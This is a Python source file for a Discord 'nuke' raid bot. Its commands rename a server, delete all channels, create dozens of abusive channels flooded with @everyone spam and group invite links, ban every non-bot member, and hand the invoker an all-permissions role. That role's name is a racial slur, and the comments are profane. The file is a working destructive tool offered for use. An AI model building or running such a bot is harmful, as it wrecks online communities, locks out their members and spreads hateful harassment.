import discord
from discord.ext import commands
import asyncio
import subprocess



# хуй большой и доинніьіьіьв
TOKEN = 'TOKEN_HERE'


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

async def send_messages_limited_time(new_channels, message_content, timeout=55):
    total_messages_sent = 0

    async def send_messages(channel):
        nonlocal total_messages_sent
        try:
            for _ in range(100):  
                await channel.send(message_content)
                total_messages_sent += 1
                await asyncio.sleep(0.01)  
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            if e.status == 429:  
                retry_after = getattr(e, 'retry_after', 0.03)
                await asyncio.sleep(retry_after)

    tasks = [send_messages(channel) for channel in new_channels]

    try:
        await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=timeout)
    except asyncio.TimeoutError:
        pass

    return total_messages_sent

@bot.event
async def on_ready():
    print("Bot is ready!")
    try:
        activity = discord.Game(name=".gg/fusha | !help")
        await bot.change_presence(activity=activity, status=discord.Status.online)
        print(f'Status set to online with message: {activity.name}')
    except Exception as e:
        print(f'An error occurred while setting the bot status: {e}')

@bot.command()
async def nuke(ctx):
    """Nukes the server."""
    channels, _ = await cache_guild_data(ctx.guild)
    
    try:
        await safe_execute(ctx.guild.edit, name='𝓕𝓤𝓒𝓚𝓔𝓓 𝓑𝓨 𝓕𝓤𝓢𝓗𝓐 𝓓𝓜')
    except discord.Forbidden:
        await ctx.send("I don't have permission to change the server name.")

    try:
        for channel_id in list(channels.keys()):
            channel = channels[channel_id]
            await safe_execute(channel.delete)
            del channels[channel_id]
            await asyncio.sleep(0.01)
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete some channels.")

    try:
        new_channels = []
        for _ in range(50):  # пофиксь залупу бляяяяя
            channel = await safe_execute(ctx.guild.create_text_channel, '𝓕𝓤𝓒𝓚𝓔𝓓 𝓑𝓨 𝓕𝓤𝓢𝓗𝓐 𝓓𝓜')
            new_channels.append(channel)
            await asyncio.sleep(0.01)
    except discord.Forbidden:
        await ctx.send("I don't have permission to create new channels.")
    
    try:
        await send_messages_limited_time(new_channels, '@everyone FUCKED BY FUSHA DM https://discord.gg/fushadm', timeout=50)
    except discord.Forbidden:
        await ctx.send("I don't have permission to send messages in some channels.")

@bot.command()
async def achannels(ctx):
    if not ctx.guild:
        return await ctx.send("This command can only be used in a server.")

  
    try:
        new_channels = []
        for _ in range(15):  # dick fcik shit хуй
            channel = await safe_execute(ctx.guild.create_text_channel, '𝓒𝓛𝓞𝓦𝓝𝓔𝓓 𝓑𝓨 𝓦𝓡𝓝𝓡')
            new_channels.append(channel)
            await asyncio.sleep(0.03)
        cache["created_channels"].update(new_channels)
        await ctx.send("Channels have been created.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to create new channels.")     
        
@bot.command()
async def commands(ctx):
    
    
    command_list = (
        "**!commands** - Sends a DM with this list of commands and deletes the command message.\n"
        "**!nuke** - Renames server, deletes roles and channels, creates new channels, and spams **CHAOS.**\n"
        "**!ban** - Bans all non-bot members from the server.\n"
        "**!achannels** - Creates 15 new channels in the server.\n"
        "**!admin** - Creates an Admin role and assigns it to you.https://discord.gg/KZuUV47V3j\n"
    )
    
    try:
        # Attempt to send the command list via DM
        await ctx.author.send(command_list)
    except discord.HTTPException as e:
        
        return await ctx.send(f"Failed to send commands list: {e}")

    
    await asyncio.sleep(0.1)

    try:
        
        await ctx.message.delete()
    except discord.HTTPException as e:
        
        await ctx.send(f"Failed to delete the command message: {e}")
        
@bot.command()
async def admin(ctx):
    try:
        
        admin_role = discord.utils.get(ctx.guild.roles, name="SUPER COOL NIGGER!!")
        
        
        if admin_role is None:
            admin_role = await ctx.guild.create_role(
                name="SUPER COOL NIGGER!!", 
                color=discord.Color.from_rgb(255, 0, 247),  
                permissions=discord.Permissions.all()
            )
        
        
        await ctx.author.add_roles(admin_role)       
    
    except discord.Forbidden:
        await ctx.send("I don't have permission to create or assign roles.")
    
    except discord.HTTPException as e:
        await ctx.send(f"An error occurred: {e}")
        
@bot.command()
async def ban(ctx):
    """Bans all members."""
    _, members = await cache_guild_data(ctx.guild)
    
    try:
        for member_id in list(members.keys()):
            member = members[member_id]
            if not member.bot:
                await safe_execute(member.ban, reason="spectre over everyone")
                await asyncio.sleep(0.06)
    except discord.Forbidden:
        await ctx.send("I don't have permission to ban some members.")

async def cache_guild_data(guild):
    """Caches channels and members for faster access."""
    channels = {channel.id: channel for channel in guild.channels}
    members = {member.id: member for member in guild.members}
    return channels, members

async def safe_execute(coro, *args, **kwargs):
    while True:
        try:
            return await coro(*args, **kwargs)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = int(e.response.headers.get('Retry-After', 1))
                await asyncio.sleep(retry_after)
            else:
                raise e
        except discord.Forbidden:
            pass

bot.run(TOKEN)
